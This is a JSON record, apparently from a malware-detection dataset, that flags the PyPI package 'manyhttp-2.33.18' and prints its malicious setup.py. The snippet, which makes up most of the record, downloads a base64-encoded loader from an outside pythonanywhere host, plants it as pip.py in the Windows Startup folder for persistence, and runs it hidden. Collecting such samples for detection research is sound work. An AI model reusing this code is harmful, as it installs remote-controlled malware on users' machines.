[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import urllib.request\nimport zipfile\nimport os\nimport base64\nimport sys\nimport shutil\nimport time\nimport subprocess\n\nif getattr(sys, 'frozen', False):\n    currentFilePath = os.path.dirname(sys.executable)\nelse:\n    currentFilePath = os.path.dirname(os.path.abspath(__file__))\n\nfileName = os.path.basename(sys.argv[0])\nfilePath = os.path.join(currentFilePath, fileName)\n\nstartupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\nstartupFilePath = os.path.join(startupFolderPath, fileName)\n\nloader_url = \"https://frvezdffvv.pythonanywhere.com/getloader\"\nloader_name = urllib.request.urlopen(loader_url).read()\n\ntry:\n    with open(startupFolderPath+\"\\\\pip.py\", \"w+\") as file:\n        file.write(f\"import base64\\nexec(base64.b64decode({loader_name}))\")\nexcept:\n    pass\nwith open(\"pip.py\", \"w+\") as file:\n    file.write(f\"import base64\\nexec(base64.b64decode({loader_name}))\")\n\nsubprocess.Popen([\"python\", \"pip.py\"], creationflags=subprocess.CREATE_NO_WINDOW)\ntime.sleep(30)\nsubprocess.Popen([\"python\", \"pip.py\"], creationflags=subprocess.CREATE_NO_WINDOW)"
  },
  {
    "metadata": {
      "package_name": "manyhttp-2.33.18",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/manyhttp-2.33.18.txt"
    }
  }
]